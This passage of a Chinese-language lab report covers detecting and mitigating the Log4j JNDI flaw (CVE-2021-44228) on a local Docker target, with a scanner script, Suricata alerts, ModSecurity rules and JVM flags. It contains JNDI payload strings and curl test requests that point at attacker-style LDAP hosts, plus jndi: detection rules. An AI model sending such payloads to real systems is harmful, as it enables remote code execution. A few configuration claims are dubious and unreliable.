        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh()
        elif args.dns_callback_provider == "dnslog.cn":
            dns_callback = Dnslog()
        elif args.dns_callback_provider == "ceye.io":
            ceye_token = "your_ceye_token"  # 替换为 ceye.io token
            ceye_domain = "your_ceye_domain"  # 替换为 ceye.io 域名
            dns_callback = Ceye(ceye_token, ceye_domain)
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(int(args.wait_time))
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets do not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Targets Affected", "yellow")
        for i in records:
            cprint(json.dumps(i), "yellow")
```

**5. 使用方法**
1. **注册 `ceye.io` 账户**：
   - 访问 [ceye.io](http://ceye.io/)，注册并获取 `token` 和 `domain`。

2. **运行工具**：
   - 使用以下命令运行工具，并指定 `ceye.io` 作为 DNS 回调服务：
     ```bash
     python3 log4j-scan.py -u http://192.168.20.6:13708/hello --dns-callback-provider ceye.io
     ```
     ![1742188207042](image/record/1742188207042.png)

3. **检查结果**：
   - 登录 `ceye.io`，也可以查看到 DNS 请求记录。
   ![1742188717540](image/record/1742188717540.png)


#### [方法四] 使用 Suricata 自动化检测

启动 suricata 检测容器
此处 eth1 对应靶机所在虚拟机的 host-only 网卡 IP
```bash
docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
```

![1741599958044](image/record/1741599958044.png)

更新 suricata 规则，更新完成测试完规则之后会自动重启服务
```bash
docker exec -it suricata suricata-update -f
```
![1741600223317](image/record/1741600223317.png)

重启 suricata 容器以使规则生效
```bash
docker restart suricata
```

监视 suricata 日志
```bash
docker exec -it suricata tail -f /var/log/suricata/fast.log
```
![1741605545264](image/record/1741605545264.png)

结果:
```bash
03/10/2025-11:17:54.889707  [**] [1:2034659:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M1 (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.20.1:55707 -> 192.168.20.6:24037
03/10/2025-11:17:54.889707  [**] [1:2034781:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M1 (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.20.1:55707 -> 192.168.20.6:24037
03/10/2025-11:18:12.474924  [**] [1:2034659:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M1 (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.20.1:55763 -> 192.168.20.6:24037
03/10/2025-11:18:12.474924  [**] [1:2034781:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M1 (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.20.1:55763 -> 192.168.20.6:24037
03/10/2025-11:18:17.979744  [**] [1:2221034:1] SURICATA HTTP Request unrecognized authorization method [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP} 192.168.20.1:54505 -> 192.168.20.6:80
```
这条日志表明 Suricata 检测到了一个 Log4j RCE（远程代码执行）尝试，使用了特定的 TCP 绕过技术（M1）

---

### 四. 漏洞防御的思考

探究一下 Log4j JNDI 攻击的 **利用流程** 以及 **可行的防御措施** ：  

#### **📌 Log4j JNDI 攻击原理**
Log4j 2.x 存在 **JNDI 远程代码执行漏洞**（CVE-2021-44228），攻击流程如下：
1. **攻击者构造恶意日志输入**  
   - 通过 **HTTP 请求头（User-Agent、Referer 等）、URL 参数、JSON 输入** 等传递带有 JNDI 语句的日志信息，例如：
     ```plaintext
     ${jndi:ldap://malicious-server.com/evil}
     ```
2. **Log4j 解析 JNDI 语句**  
   - Log4j 发现 `${jndi:}` 变量后，会尝试解析其中的 LDAP/RMI 地址。
3. **远程 LDAP 服务器提供恶意类**  
   - 服务器连接 **攻击者的 LDAP 服务器**，获取恶意 Java 类文件路径。
4. **服务器加载恶意 Java 类并执行**  
   - 服务器 **反序列化并执行恶意代码**，导致远程代码执行（RCE）。

---

#### **🛡️ Log4j JNDI 攻击的五种防御措施**

##### **1️⃣ 使用 Web 应用防火墙（WAF）拦截**
📌 **原理**：  
- WAF 通过 **检测 HTTP 请求**，阻止带有 `jndi:ldap://` 的恶意输入。  

⚙ **实现方式**：
- 配置 WAF 规则，拦截匹配 JNDI 语法的请求：
  ```plaintext
  SecRule REQUEST_HEADERS "@rx (\${jndi:(ldap|rmi|dns):/})" "id:1001,phase:1,deny,status:403"
  ```
- 启用 **ModSecurity** 或云端 WAF（如 Cloudflare、AWS WAF）。

---

##### **2️⃣ 禁用 JNDI 查找**
📌 **原理**：  
- 直接 **禁用 Log4j 的 JNDI 查找功能**，防止它解析 `${jndi:}` 变量。  

⚙ **实现方式**：
- **方法 1（修改配置文件）**：  
  在 `log4j2.component.properties` 文件中添加：
  ```properties
  log4j2.formatMsgNoLookups=true
  ```
- **方法 2（启动参数）**：  
  ```bash
  -Dlog4j2.formatMsgNoLookups=true
  ```
- **方法 3（环境变量）**：
  ```bash
  export LOG4J_FORMAT_MSG_NO_LOOKUPS=true
  ```

---

##### **3️⃣ 立即修复 Log4j**
📌 **原理**：  
- 通过 **升级 Log4j 到安全版本**，彻底移除漏洞。

⚙ **实现方式**：
- **升级到安全版本**（`2.17.0+`）：  
  ```bash
  mvn dependency:tree | grep log4j
  mvn versions:use-latest-versions
  mvn clean install
  ```
- **移除 `JndiLookup.class`**（临时方案）：
  ```bash
  zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
  ```

---

##### **4️⃣ 禁用远程代码库**
📌 **原理**：  
- 服务器默认 **不应允许远程类加载**，防止攻击者注入恶意代码。

⚙ **实现方式**：
- **方法 1（Java 启动参数）**：
  ```bash
  -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
  ```
- **方法 2（修改 Java 安全策略）**：
  在 `java.security` 文件中添加：
  ```properties
  jdk.jndi.object.factoriesFilter=!(com.sun.jndi.ldap.object.trustURLCodebase)
  ```

---

##### **5️⃣ 禁用 Java 反序列化**
📌 **原理**：  
- 反序列化攻击是远程代码执行的主要方式，禁用不必要的反序列化可减少风险。

⚙ **实现方式**：
- **方法 1（JVM 限制反序列化）**：
  ```bash
  -Djava.security.manager
  ```
- **方法 2（安全库）**：
  - 使用 **Apache Commons Collections** 或 **GadgetInspector** 进行安全检查。
- **方法 3（使用安全的反序列化方式）**：
  - 使用 `ObjectInputStream` 时，白名单允许的类：
    ```java
    ObjectInputStream in = new ObjectInputStream(inputStream) {
        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
            if (!allowedClasses.contains(desc.getName())) {
                throw new InvalidClassException("Unauthorized deserialization attempt");
            }
            return super.resolveClass(desc);
        }
    };
    ```

---

#### **📌 结论**
- **Log4j JNDI 攻击利用远程代码加载**，通过 **LDAP/RMI 远程注入恶意 Java 类**，导致 RCE。
- **五种关键防御措施**：
  1. **WAF 拦截** 恶意 JNDI 请求。
  2. **禁用 JNDI 查找**，避免解析恶意字符串。
  3. **升级 Log4j**，彻底修复漏洞。
  4. **禁用远程代码库**，防止恶意类加载。
  5. **禁用 Java 反序列化**，减少 RCE 风险。

---

### 五. 漏洞缓解

#### 第一种方法: 打造Web应用防火墙（WAF）来缓解Log4j漏洞

##### [1] 实验目标
- 本次实验的主要目标是搭建并配置 ModSecurity Web 应用防火墙（WAF），以防御 Log4j 漏洞攻击。通过实验，掌握以下内容：
   - ModSecurity 的安装与配置。
   - OWASP 核心规则集（CRS）的使用。
   - 针对 Log4j 漏洞的自定义规则配置。
   - 通过反向代理测试 WAF 的拦截效果。
   - 解决实验过程中遇到的常见问题。

---

##### [2] 实验具体流程

1. **安装ModSecurity**
   ModSecurity 是一个开源的 Web 应用防火墙（WAF）模块，支持 Apache、Nginx 等 Web 服务器。它通过检测和拦截恶意请求来保护 Web 应用程序。

2. **安装Apache和ModSecurity**
   ```bash
   sudo apt update
   sudo apt install apache2 libapache2-mod-security2
   ```
   - apache2 是 Apache HTTP 服务器。
   - libapache2-mod-security2 是 ModSecurity 的 Apache 模块。
   ![1741775078441](image/record/1741775078441.png)

3. **配置ModSecurity**
(1) 备份默认配置文件：
   ```bash
   sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
   ```
   ![1741775099290](image/record/1741775099290.png)
   - 默认情况下，ModSecurity 提供了一个推荐的配置文件 modsecurity.conf-recommended。
   - 复制该文件为 modsecurity.conf，以便进行自定义配置。

(2) 编辑配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```
   将`SecRuleEngine`设置为`On`：
   ```bash
   SecRuleEngine On
   ```
   SecRuleEngine 控制 ModSecurity 的规则引擎状态,有以下三种状态:
   - Off：完全禁用规则引擎。
   - DetectionOnly：启用规则引擎，但仅用于检测，不会拦截恶意请求。
   - On：启用规则引擎，检测并拦截恶意请求。
   
   ![1741775203324](image/record/1741775203324.png)

(3) 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   Apache 在启动时会加载 ModSecurity 模块及其配置文件。
   ![1741775226384](image/record/1741775226384.png)

---

##### [3] 使用OWASP核心规则集（CRS）

- OWASP CRS提供了一套规则，用于防御常见Web攻击。

(1) 下载OWASP CRS
```bash
sudo apt install modsecurity-crs
```
OWASP CRS 是一组预定义的规则，覆盖了多种 Web 攻击类型。
![1741775253921](image/record/1741775253921.png)

(2) 配置OWASP CRS
1. 将规则集链接到ModSecurity：
   ```bash
   sudo ln -s /usr/share/modsecurity-crs/ /etc/apache2/modsecurity-crs
   ```
    ![1741775276865](image/record/1741775276865.png)
   - 创建符号链接是为了让 ModSecurity 能够方便地访问和加载 OWASP CRS 提供的规则文件。
2. 在ModSecurity配置中加载规则集：
   ```bash
   sudo vim /etc/apache2/mods-enabled/security2.conf
   ```
   添加以下内容：
   ```bash
   IncludeOptional /etc/apache2/modsecurity-crs/*.conf
   IncludeOptional /etc/apache2/modsecurity-crs/rules/*.conf
   ```
   这样配置后,IncludeOptional 指令告诉 Apache 加载指定路径下的所有 .conf 文件。加载 /etc/apache2/modsecurity-crs/ 目录下的所有主配置文件。加载该目录下 rules/ 子目录中的所有规则文件
   ![1741775320254](image/record/1741775320254.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   ModSecurity 会在每次请求时应用这些规则，检测并拦截恶意流量。

---

##### [4] 自定义Log4j漏洞规则配置

- 为了防御 Log4j 漏洞攻击，需要添加针对 jndi: 的自定义规则。

(1) 添加自定义规则
1. 创建自定义规则文件：
   ```bash
   sudo vim /etc/apache2/modsecurity-crs/rules/REQUEST-900-LOG4J.conf
   ```

2. 添加以下规则：
   ```bash
   SecRule ARGS|ARGS_NAMES|REQUEST_HEADERS|!REQUEST_HEADERS:Referer "@contains jndi:" \
       "id:1001,phase:2,log,deny,status:403,msg:'Potential Log4j Exploit Attempt'"
   ```
   | 参数名称       | 说明                     |
   |:---------------|:-------------------------|
   | SecRule        | ModSecurity 的核心指令，用于定义规则 |
   | ARGS/ARGS_NAMES/REQUEST_HEADERS | 检测请求参数、请求头 |
   | @contains jndi: | 匹配包含 jndi: 的内容 |
   | id:1001        | 规则的唯一标识符         |
   | phase:2        | 在请求处理的第二阶段（请求体解析后）执行规则 |
   | log            | 记录日志                 |
   | deny           | 拒绝请求                 |
   | status:403     | 返回 HTTP 403 Forbidden 响应 |
   | msg            | 日志消息                 |

   ![1741775386698](image/record/1741775386698.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```

---

##### [5] 监控和日志分析

- 启用ModSecurity的日志功能，记录所有拦截的请求，便于后续分析。

(1) 配置日志

1. 编辑ModSecurity配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```

2. 确保日志路径正确：
   ```bash
   SecAuditLog /var/log/apache2/modsec_audit.log
   ```
   - SecAuditLog 指令用于指定 ModSecurity 审计日志的存储路径。
   - /var/log/apache2/modsec_audit.log 是默认的日志文件路径，记录所有拦截的请求及其详细信息。
3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```

---

##### [6] 配置 Apache 监听 `81` 端口

编辑 Apache 的配置文件：
```bash
sudo vim /etc/apache2/ports.conf
```
将 `Listen 80` 改为 `Listen 81`。

编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
将 `<VirtualHost *:80>` 改为 `<VirtualHost *:81>`。

重启 Apache：
```bash
sudo systemctl restart apache2
```

---

##### [7] **配置反向代理**
启用 Apache 的反向代理模块：
```bash
sudo a2enmod proxy
sudo a2enmod proxy_http
```
- a2enmod 命令用于启用 Apache 模块。
proxy 和 proxy_http 模块用于实现反向代理功能。
- 编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
在 `<VirtualHost *:81>` 块中添加以下内容：
```bash
<VirtualHost *:81>
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:23509/
    ProxyPassReverse / http://127.0.0.1:23509/
</VirtualHost>
```
![1741776929374](image/record/1741776929374.png)

重启 Apache：
```bash
sudo systemctl restart apache2
```
- Apache 将开始监听 81 端口，并将所有请求通过反向代理转发到 23509 端口。


- **目前的拓扑图:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Log4j 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81        | 2. iptables 重定向到 23509    | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求             |
        |                           | (返回 403 Forbidden)       |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)         |
```

---

##### [8] 测试 WAF 是否拦截恶意请求
运行以下命令测试 WAF 是否拦截包含 `jndi:` 的请求：
```bash
curl -X POST http://192.168.20.6:81/ -d "param1=jndi:ldap://chloris.check4safe.top/exploit"
```
- 通过 curl 命令向 81 端口发送一个包含 jndi: 的恶意请求。
- 如果 WAF 配置正确，应该返回 403 Forbidden，表示请求被拦截。
- 如果请求被拦截，ModSecurity 会在日志文件中记录详细的请求信息。
![1742800512003](image/record/1742800512003.png)

---

##### [9] 现在的情况以及存在的问题
- 直接 `curl` `23509` 端口可以测试 Log4j 漏洞，但无法测试 WAF 的效果。
- 通过反向代理的方式，可以让请求经过 Apache 和 ModSecurity，从而测试 WAF 是否能够拦截恶意请求。
- 使用 `curl` 向 `81` 端口发送请求，验证 WAF 是否生效。
- 通过以上步骤，我在Kali Linux上搭建一个基础的WAF，缓解Log4j等漏洞。定期更新规则集和监控日志是确保WAF持续有效的关键。

**为什么需要经过 Apache？**
1. **WAF 的作用**：WAF（Web 应用防火墙）的目的是检测并拦截恶意请求。如果请求直接到达 Log4j 测试环境，WAF 就无法发挥作用。
2. **测试 WAF 的效果**：需要验证 WAF 是否能够正确拦截包含 `jndi:` 的恶意请求。如果请求不经过 WAF，就无法测试 WAF 的效果。
WAF（ModSecurity）全部设在了 81 端口：Apache 监听 81 端口，并通过 ModSecurity 检测所有到达该端口的请求。

**但是如果直接 `curl` `23509` 端口 :**
- 请求会直接到达 Log4j 测试环境。
- WAF 不会检测请求，因此即使请求包含 `jndi:`，也不会被拦截。
- 无法验证 WAF 是否生效。

---

##### [10] 改进

1. **查看当前 iptables 规则**
运行以下命令，查看当前的 iptables 规则：
```bash
sudo iptables -t nat -L -n -v
```

2. **确保规则正确**
检查是否有以下规则：
   ```bash
   Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
   pkts bytes target     prot opt in     out     source               destination         
      0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8080 redir ports 81
   ```
   接着重新添加规则：
   ```bash
   sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 81
   ```

3. **保存 iptables 规则**
   确保规则在重启后仍然生效：
   ```bash
   sudo iptables-save | sudo tee /etc/iptables/rules.v4
   ```

4. **检查 Apache 反向代理配置**
   打开 Apache 的虚拟主机配置文件：
   ```bash
   sudo vim /etc/apache2/sites-available/000-default.conf
   ```
   确保配置如下：
   ```bash
   <VirtualHost *:81>
       ProxyPreserveHost On
       ProxyPass / http://127.0.0.1:8080/
       ProxyPassReverse / http://127.0.0.1:8080/
   </VirtualHost>
   ```
   保存并退出编辑器。

5. **检查 Target Server 监听地址**

   修改 Target Server 也就是log4j服务的dockerfile配置文件，使其仅监听 `127.0.0.1:8080`。
   - 例如，如果 Target Server 是一个 Java 应用，可以在启动命令中指定绑定地址：
     ```bash
     java -jar demo.jar --server.address=127.0.0.1 --server.port=8080
     ```
     ![1742384631913](image/record/1742384631913.png)
   我在应用程序中设置了 ``server.address=127.0.0.1``，在 Docker 容器中，``127.0.0.1`` 指的是容器内部的回环接口，而不是宿主机的回环接口。因此，即使容器的 8080 端口映射到了宿主机的 8080 端口，外部请求也无法通过宿主机的 IP 地址和端口访问到容器中的应用程序，因为应用程序只监听容器内部的 ``127.0.0.1``, 如果希望外部能够通过宿主机的 IP 地址和端口访问容器中的应用程序，需要将应用程序的监听地址设置为 ``0.0.0.0``
   - 重启docker 容器
   ![1742384671983](image/record/1742384671983.png)

   确保 Target Server 不再监听外部地址（如 `0.0.0.0:8080`）。

6. **测试配置**
   运行以下命令，测试 iptables 重定向是否生效：
   ```bash
   curl http://<Target-IP>:8080/
   ```
   - 如果配置正确，流量会被重定向到 `81` 端口，并经过 WAF。

   检查 Apache 日志，确认请求是否被正确处理：
   ```bash
   tail -f /var/log/apache2/access.log
   ```

---

##### [11] 总结一下当前进度

1. **核心问题**
- iptables 规则未生效，导致流量绕过 WAF。
- Apache 反向代理配置可能存在问题，导致请求未正确转发。

2. **解决步骤**
   (1) **检查并修复 iptables 规则**：
      - 确保所有到达 `8080` 端口的流量被重定向到 `81` 端口。
   
   (2) **检查 Apache 反向代理配置**：
   - 确保 Apache 监听 `81` 端口，并将请求转发到 `127.0.0.1:8080`。
   
   (3) **检查 Target Server 监听地址**：
   - 确保 Target Server 仅监听 `127.0.0.1:8080`，避免外部直接访问。

3. **最终效果**
- 客户端访问 `http://<Target-IP>:8080` 时，流量会被重定向到 WAF 的 `81` 端口。
- WAF 检测请求后，合法请求会被转发到 Target Server，恶意请求会被拦截。

从 `iptables` 配置来看，成功添加了以下规则：

```bash
-A PREROUTING -p tcp -m tcp --dport 8080 -j REDIRECT --to-ports 81
```
![1742387356052](image/record/1742387356052.png)
将所有到达 `8080` 端口的 TCP 流量重定向到 `81` 端口。理论上，这些规则应该生效，但我发现 `curl` 访问 `8080` 端口时仍然可以成功访问，而 `81` 端口被 WAF 拦截。这表明 **iptables 规则可能没有完全生效**，或者 **流量绕过了 iptables 规则**。

---

##### [12] 出现新问题

正如上面所写 , 这时iptables规则尚未生效

1. **分析可能原因 : 流量未经过 PREROUTING 链**：
   - 如果流量是从本机发出的（例如 `curl http://127.0.0.1:8080`），它不会经过 `PREROUTING` 链，而是直接进入 `OUTPUT` 链。
   - `PREROUTING` 链只对从外部进入的流量生效。

2. **解决方案**
   (1) **确保 iptables 规则生效**
      检查流量是否经过 PREROUTING 链
      - 如果从本机测试（例如 `curl http://127.0.0.1:8080`），流量不会经过 `PREROUTING` 链。
      - 改为从外部机器测试（例如 `curl http://<Target-IP>:8080`），确保流量经过 `PREROUTING` 链。

   (2) **添加 OUTPUT 链规则**
   如果必须从本机测试，可以在 `OUTPUT` 链中添加规则，将本机发出的流量重定向到 `81` 端口：
   ```bash
   sudo iptables -t nat -A OUTPUT -p tcp --dport 8080 -j REDIRECT --to-port 81
   ```

3. **保存规则**
   确保规则在重启后仍然生效：
   ```bash
   sudo iptables-save | sudo tee /etc/iptables/rules.v4
   ```
   ![1742387633892](image/record/1742387633892.png)

4. **测试最终效果**
   - 从外部机器测试 , 发送请求到 `8080` 端口：
      ```bash
      curl http://<Target-IP>:8080/
      ```
      检查是否被重定向到 `81` 端口，并经过 WAF。

   - 从本机测试 , 发送请求到 `8080` 端口：
      ```bash
      curl http://127.0.0.1:8080/
      ```
      检查是否被重定向到 `81` 端口，并经过 WAF。

---

##### [13] 测试 WAF 拦截

   发送包含恶意 payload 的请求：
   ```bash
   curl -X POST http://<Target-IP>:8080/ -d "param1=jndi:ldap://chloris.check4safe.top/exploit"
   ```
   检查是否返回 `403 Forbidden`，并查看 ModSecurity 日志：
   ```bash
   tail -f /var/log/apache2/modsec_audit.log
   ```

   这时再curl 一下,会发现了返回想要的指定指令,证明了攻击防御成功!
   - curl log4j服务所在的8080端口返回的内容 `Potential Log4j Exploit Attempt`
   ![1742384700408](image/record/1742384700408.png)

   - curl WAF服务所在的81端口返回的内容 `Potential Log4j Exploit Attempt`
   ![1742384732731](image/record/1742384732731.png)

   - curl 无服务所在的8082端口返回的内容显示`Fail to connect`
   ![1742384754500](image/record/1742384754500.png)


- **目前的网络拓扑图:**
   ```bash
   +-------------------+       +-------------------+       +-------------------+
   |      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
   |    (curl 请求)    |       |   + ModSecurity)  |       | (Log4j 测试环境) |
   +-------------------+       +-------------------+       +-------------------+
         |                           |                           |
         | 1. 发送请求到 81        | 2. iptables 重定向到 23509    | 3. 处理请求
         | ------------------------> | ------------------------> |
         |                           |                           |
         |                           | 4. 拦截恶意请求            |
         |                           | (返回 403 Forbidden)      |
         | <------------------------ |                           |
         |                           |                           |
         |                           | 5. 记录日志                |
         |                           | (modsec_audit.log)        |
   ```

   ```bash
   +-------------------+       +-------------------+       +-------------------+
   |      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
   |    (curl 请求)    |       |   + ModSecurity)  |       | (Log4j 测试环境) |
   +-------------------+       +-------------------+       +-------------------+
         |                                                     |
         |                      1. 发送请求到 23509           
         | ---------------------------------------------------> |
         |                            2. iptables 重定向到 81
                                       <------------------------ 
                                       3. 处理请求
         |                           |
         |                           | 4. 拦截恶意请求              |
         |                           | (返回 403 Forbidden)        |
         | <------------------------ |                             |
         |                           |                             |
         |                           | 5. 记录日志                  |
         |                           | (modsec_audit.log)          |
   ```

---

##### [14] 最终总结

1. **核心问题**
- iptables 规则可能被 Docker 干扰，或者流量未经过 `PREROUTING` 链。
- 需要确保流量经过 WAF，而不是直接访问 Target Server。

2. **解决步骤**
   - **添加 OUTPUT 链规则**：确保本机流量也被重定向。
   - **排除 Docker 干扰**：暂时停止 Docker 服务，测试规则是否生效。
   - **检查 Apache 配置**：确保 Apache 监听 `81` 端口并正确转发请求。

3. **最终效果**
- 所有到达 `8080` 端口的流量（无论是外部还是本机）都会被重定向到 `81` 端口。
- WAF 检测请求后，合法请求会被转发到 Target Server，恶意请求会被拦截。

---

##### [15] 恢复默认配置,便于进行后续实验
1. **删除 iptables 重定向规则**
   运行以下命令，查看当前的 `PREROUTING` 和 `OUTPUT` 链规则：
   ```bash
   sudo iptables -t nat -L -n -v
   ```

2. **删除重定向规则**
   删除 `PREROUTING` 链中的重定向规则：
   ```bash
   sudo iptables -t nat -D PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 81
   ```

   之前还添加了 `OUTPUT` 链规则，也需要删除：
   ```bash
   sudo iptables -t nat -D OUTPUT -p tcp --dport 8080 -j REDIRECT --to-port 81
   ```
   ![1742401796690](image/record/1742401796690.png)

3. **保存 iptables 规则**
   确保删除规则后，保存当前配置：
   ```bash
   sudo iptables-save | sudo tee /etc/iptables/rules.v4
   ```
   ![1742401815539](image/record/1742401815539.png)

4. **关闭 Apache 反向代理**
   打开 Apache 的虚拟主机配置文件：
   ```bash
   sudo vim /etc/apache2/sites-available/000-default.conf
   ```

   删除或注释掉反向代理配置：
   ```bash
   # <VirtualHost *:81>
   #     ProxyPreserveHost On
   #     ProxyPass / http://127.0.0.1:8080/
   #     ProxyPassReverse / http://127.0.0.1:8080/
   # </VirtualHost>
   ```

5. **禁用相关模块**
   禁用 `proxy` 和 `proxy_http` 模块：
   ```bash
   sudo a2dismod proxy
   sudo a2dismod proxy_http
   ```

   重启 Apache 以使更改生效：
   ```bash
   sudo systemctl restart apache2
   ```

6. **恢复 Target Server 配置**
   之前修改了 Target Server 的绑定地址（例如绑定到 `127.0.0.1`），需要恢复其监听外部地址（如 `0.0.0.0`）。
   **修改 Target Server 配置文件**
   - 打开 Target Server 的配置文件（如 `application.properties` 或启动命令）。
   - 将绑定地址改为 `0.0.0.0`：
      ```bash
      java -jar target-app.jar --server.address=0.0.0.0 --server.port=8080
      ```

7. **验证恢复结果**
   确保重定向规则已被删除：
   ```bash
   sudo iptables -t nat -L -n -v
   ```
   确保 Apache 不再监听 `81` 端口：
      ```bash
      sudo netstat -tuln | grep 81
      ```
   确保 Apache 不再转发请求到 `8080` 端口。

8. **测试 Target Server**
- 从客户端访问 Target Server：
   ```bash
   curl http://<Target-IP>:8080/
   ```
- 确保 Target Server 正常响应。

![1742401884270](image/record/1742401884270.png)

---

##### [16] 第一种方法总结

成功搭建并配置了 ModSecurity WAF，能够有效拦截 Log4j 漏洞攻击。实验过程中，学习了以下内容：
1. ModSecurity 的安装与配置。
2. OWASP CRS 的使用。
3. 针对 Log4j 漏洞的自定义规则配置。
4. 通过反向代理测试 WAF 的拦截效果。
5. 解决实验过程中遇到的常见问题。

实验结果表明，WAF 能够有效防御 Log4j 漏洞攻击，但需要定期更新规则集和监控日志，以确保其持续有效。

---


不影响ping别的ip地址
![1741777109040](image/record/1741777109040.png)
![1741777079341](image/record/1741777079341.png)
![1741777189751](image/record/1741777189751.png)

---

#### 第二种方法: 禁用 lookup 服务

##### 1. 构建 Docker 镜像

(1) **编写 Dockerfile**：
   - 在 `Dockerfile` 中定义了基于 `vulfocus/log4j2-rce-2021-12-09:1` 的镜像。
   - 设置环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` 来防止 Log4j 漏洞。
   - 暴露容器的内部端口为 `8080`。
   - 设置容器启动命令为运行 `/demo/demo.jar`。
      ```dockerfile
      # 基于现有的镜像
      FROM vulfocus/log4j2-rce-2021-12-09:1
      # 设置环境变量（根据需要添加或修改）
      ENV LOG4J_FORMAT_MSG_NO_LOOKUPS=true
      # 固定容器的内部端口为 8080（无需在 Dockerfile 中指定端口映射，这在运行时完成）
      EXPOSE 8080
      # 设置容器的启动命令（如果需要修改默认启动命令）
      CMD ["java", "-jar", "/demo/demo.jar"]
      ```
      ![1742219437298](image/record/1742219437298.png)

(2) **构建 Docker 镜像：**
   - 使用 `docker build` 命令构建镜像，并将其命名为 `my-log4j2-rce:1`。
      ```bash
      docker build -t my-log4j2-rce:1 .
      ```
      ![1742219515320](image/record/1742219515320.png)

##### 2. 运行 Docker 容器
   - 使用 `docker run` 命令启动 `my_log4j2_container` 容器。
   - 将容器的 `8080` 端口映射到主机的 `8080` 端口。
   - 后台运行容器 (`-d` 参数)。
   ```bash
   docker run -d --name my_log4j2_container -p 8080:8080 my-log4j2-rce:1
   ```

##### 3. 验证容器运行状态
   - 使用 `docker ps` 命令查看正在运行的容器，确认 `my_log4j2_container` 已成功启动并运行正常。
   ![1742219531763](image/record/1742219531763.png)


##### 4. 访问应用
   - 打开浏览器或使用 `curl` 命令访问 `http://localhost:8080/hello`，验证应用是否可以正常访问。
      ```bash
      curl http://localhost:8080/hello
      ```
      ![1742219627219](image/record/1742219627219.png)
      ![1742219066595](image/record/1742219066595.png)

##### 5. 测试 Log4j 漏洞防护效果
   - 使用 `curl` 发送包含 `${jndi:ldap://chloris.check4safe.top}` 的请求，测试 Log4j 漏洞防护效果。
      ```bash
      curl -G --data-urlencode "payload=${jndi:ldap://chloris.check4safe.top}" http://localhost:8080/hello -vv
      ```
      - 如果配置正确，请求应该被拦截，返回 `403 Forbidden` 和我之前配置的错误信息。
      ![1742800417881](image/record/1742800417881.png)

- 完成 !

---

#### 第三种方法: 通过JVM参数禁用JNDI查找

##### 1. 分析当前环境

首先，需要分析被攻击的容器环境：

```bash
docker ps
```

输出：

```
CONTAINER ID   IMAGE                               COMMAND                CREATED          STATUS          PORTS                                         NAMES
8e86d0e9ef1e   vulfocus/log4j2-rce-2021-12-09:1   "java -jar /demo/dem…" About a minute ago   Up About a minute   0.0.0.0:40615->8080/tcp, :::40615->8080/tcp   objective_driscoll
```

检查容器详情：

```bash
docker inspect objective_driscoll
```

![1742742983303](image/网络安全丁梦/1742742983303.png)

##### 2. 临时缓解措施 - 通过JVM参数禁用JNDI查找

1. **停止当前容器**

```bash
docker stop objective_driscoll
```

2. **重新启动并添加JVM参数来禁用JNDI查找**

```bash
# 移除旧容器但保留其名称以重用
docker rm objective_driscoll

# 使用相同的镜像启动新容器，但添加安全参数
docker run -d --name objective_driscoll \
  -e JAVA_OPTS="-Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true" \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
